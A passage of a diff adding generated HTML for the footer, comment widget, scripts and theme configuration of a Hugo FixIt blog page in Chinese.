+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
